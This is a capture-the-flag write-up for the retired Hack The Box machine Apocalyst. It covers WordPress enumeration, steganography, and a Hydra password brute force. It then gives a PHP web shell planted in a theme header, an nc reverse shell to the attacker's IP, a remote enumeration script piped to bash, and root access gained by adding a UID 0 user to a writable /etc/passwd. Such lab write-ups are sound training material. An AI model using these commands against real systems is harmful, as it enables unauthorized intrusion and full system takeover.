# Apocalyst

This is the write-up for the box Apocalyst that got retired at the 25th November 2017.
My IP address was 10.10.14.28 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.46    apocalyst.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/apocalyst.nmap 10.10.10.46
```

```markdown
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 fd:ab:0f:c9:22:d5:f4:8f:7a:0a:29:11:b4:04:da:c9 (RSA)
|   256 76:92:39:0a:57:bd:f0:03:26:78:c7:db:1a:66:a5:bc (ECDSA)
|_  256 12:12:cf:f1:7f:be:43:1f:d5:e6:6d:90:84:25:c8:bd (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 4.8
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apocalypse Preparation Blog
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Checking HTTP (Port 80)

On the web page there is an "Apocalypse Preparation Blog" that is installed on WordPress with the _Twentyseventeen theme_. This gets visible when browsing to the pages hostname _apocalyst.htb_.
```markdown
wpscan --url http://apocalyst.htb --enumerate u
```

The WordPress version is 4.8 and the only user found is called _falaraki_.
Lets look for hidden paths with **Gobuster**:
```markdown
gobuster -u http://apocalyst.htb dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Almost every word in the wordlist responses with a HTTP Code 301 and when we browse to them we always get the same page with just an image.
The pages redirect to a page with an appending slash at the end of the path and have a length of 157.

When we use the parameter for a trailing slash in _Gobuster_ then we get a HTTP Code 200 for every word in the wordlist.
Lets use **Cewl** to generate a wordlist based upon the words from the blog page:
```markdown
cewl apocalyst.htb -w cewl.txt
```

The _cewl.txt_ will now be used as a wordlist for **Gobuster** with the trailing slash parameter _(-f)_:
```markdown
gobuster -u http://apocalyst.htb dir -w cewl.txt -f -l | tee gobuster.txt
```

We send the output to a file _gobuster.txt_ and filter for any line that has not the length of 157 in it.
```markdown
cat gobuster.txt | grep -v 'Size: 157'
```

There is the word **Rightiousness** that responds with a length of 175.

Browsing to that page we still get the same image but a comment in the source that says _needle_.
It seems like we found the needle in the haystack and have to do something with this image.

### Analyzing the image

When getting an image file, it is often good to look for hidden files in them via **Steganography**.
Using **Steghide** to try to extract files from it:
```markdown
steghide extract -sf image.jpg
```

This works without a password and extracts the file _list.txt_ which seems to be a wordlist with 486 words.

### Authenticating on WordPress

We use the wordlist we gathered with **Hydra** to get the authentication credentials for the user _falaraki_:
```markdown
hydra -l falaraki -P list.txt apocalyst.htb http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fapocalyst.htb%2Fwp-admin%2F&testcookie=1:is incorrect"
```

After a while the password is found:
> Transclisiation

Now access with the credentials is granted and we modify a PHP file to get code execution.
```markdown
Appearance --> Editor --> Theme Header
```

Modifying the _header.php_ file to execute the following code:
```php
<?php
echo system($\_REQUEST['cmd']);
// (...)
?>
```

Browsing to "hxxp://apocalyst.htb/?cmd=whoami" outputs _www-data_ from the `whoami` command in the source.
With this command execution we can start a reverse shell:
```markdown
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.28 9001 >/tmp/f

# URL-encoded:
http://apocalyst.htb/?cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.28+9001+>/tmp/f
```

Executing this results in starting a reverse shell on the listener that listens on my IP and port 9001.

## Privilege Escalation

To get an attack surface it would be useful to start any Linux enumeration script on the box:
```markdown
wget http://10.10.14.28/LinEnum.sh | bash
```

One interesting result is that **/etc/passwd** is writeable by all users:
```markdown
-rw-rw-rw- 1 root root 1637 Jul 26  2017 /etc/passwd
```

This means that it is possible to create users or change passwords from other users. Lets create a password for a new user:
```markdown
openssl passwd -1 -salt newuser Pass1234
```

And then edit the file to create _newuser_ with the pasword and UserID and GroupID 0:
```markdown
newuser:$1$newuser$82ynj4089D97/6jtzM22O.:0:0:root:/root:/bin/bash
```

Now we can switch with `su newuser` to the created user and start a root shell!
